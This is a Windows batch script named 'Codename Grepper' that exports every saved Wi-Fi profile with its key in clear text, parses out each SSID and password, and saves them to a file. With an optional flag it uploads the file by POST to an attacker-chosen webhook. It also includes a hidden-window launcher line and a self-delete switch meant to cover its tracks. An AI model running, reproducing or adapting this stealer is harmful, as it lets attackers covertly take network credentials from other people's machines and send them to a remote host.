:: Copyright (c) 2025 GivX
:: This file is part of Codename Grepper.
:: It is used along with CMD to grep wifi credentials.

:: @powershell -window Hidden -command "" & :: Uncomment this line to hide the window
@Echo off
:: Change the current encoding to print special chars
powershell -c "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8"

:: Default values. Change them to your needs.
set selfdelete=0
set upload=0
set "resultfile=grepper.txt"
set "webhookurl="

:: Arguments
if "%~1"=="--upload" if "%~2" neq "" (
  set "webhookurl=%~2"
  set upload=1
)

if "%~1"=="--output" if "%~2" neq "" (
  set "resultfile=%~2"
  set upload=0
)

:: Prepare env for the xmls
del %resultfile% 2>nul
rmdir /s /q "%temp%\profiles" 2>nul
mkdir "%temp%\profiles" 2>nul
pushd "%temp%\profiles"

:: Prepare the str2hex.vbs file
call :init
netsh wlan export profile key=clear >nul

:: Check for XML files, if none are around, then there are no saved profiles
set /a f=0
for /f %%i in ('dir /b') do (set /a f+=1)
:: 1 for str2hex.vbs
if %f%==1 (
  echo [-] No Wi-Fi profiles found.>>%resultfile%
  goto endRepeat
)

:Repeat
  :: Get the name of the last enumerated xml file
  set "file="
  for /f "delims=:" %%i in ('dir /b *.xml 2^>nul') do (set file=%%i)
  if "%file%"=="" (goto endRepeat)
  :: Convert file value to hex, then rename the file with that name (to avoid spaces)
  set "_file=%file%"
  for /f %%a in ('cscript //nologo str2hex.vbs "%file%"') do set "file=%%a"
  rename "%_file%" %file% 2>&1 >nul

  :: Get name
  set "name="
  for /f "skip=1 tokens=*" %%j in ('findstr /c:"<name>" "%file%"') do set "name=%%j"
  set "name=%name:<name>=%"
  set "name=%name:</name>=%"
  :: Avoid program crashes if the name is empty
  set "name=%name:&=^&%"

  :: convert name to hex
  set "name_hex="
  for /f "tokens=*" %%j in ('findstr /c:"<hex>" "%file%"') do set "name_hex=%%j"
  set "name_hex=%name_hex:<hex>=%"
  set "name_hex=%name_hex:</hex>=%"

  :: Get Password
  set "key="
  for /f "tokens=*" %%j in ('findstr /c:"<keyMaterial>" "%file%"') do set "key=%%j"
  if "%key%"=="" set "key=none"
  set "key=%key:<keyMaterial>=%"
  set "key=%key:</keyMaterial>=%"
  :: Avoid program crash with apsswords that contain "&"
  set "key=%key:&=^&%"

  :: convert key to hex
  for /f %%a in ('cscript //nologo str2hex.vbs "%key%"') do set "key_hex=%%a"

  del "%file%" 2>nul

  echo.
  echo [!] SSID: %name%
  echo [!] Password: %key%

  :: Fix echo problem
  setlocal EnableDelayedExpansion
  echo [^^!] SSID: !name!>>%resultfile%
  endlocal
  echo [+] Password: %key%>>%resultfile%
  echo [!] Hex pair: %name_hex%3a%key_hex%>> %resultfile%
  :: Hex pairs are added as a precautin in case SSID/pass contains special chars
  echo.>>%resultfile%
goto Repeat
:endRepeat

:: Cleanup
popd

:: Send resultfile to webhook
if %upload%==1 (
  powershell -c "Invoke-RestMethod -Uri '%webhookurl%' -Method POST -Body (Get-Content -Raw -Path '%temp%\profiles\%resultfile%') -ContentType 'text/plain'" >nul
  del %resultfile% 2>nul
)

:: The program will delete itself after the first run
if %selfdelete%==1 (
  rmdir /s /q "%temp%\profiles" 2>nul &:: Very important!
  del "%~f0" 2>nul
)

move "%temp%\profiles\%resultfile%" "%cd%" 2>&1 >nul
rmdir /s /q "%temp%\profiles" 2>nul
exit /b

:init
  :: Prepare str2hex.vbs script to be used for string conversion to hex
  :: Note: It's faster to use a vbs script to convert to hex than powershell
  (echo inputString = WScript.Arguments.Item(0^)
   echo hexString = ""
   echo For i = 1 To Len^(inputString^)
   echo hexValue = Hex^(Asc^(Mid^(inputString^, i, 1^)^)^)
   echo hexString = hexString ^& hexValue
   echo Next
   echo WScript.Echo hexString) > str2hex.vbs
Exit /b
  
  
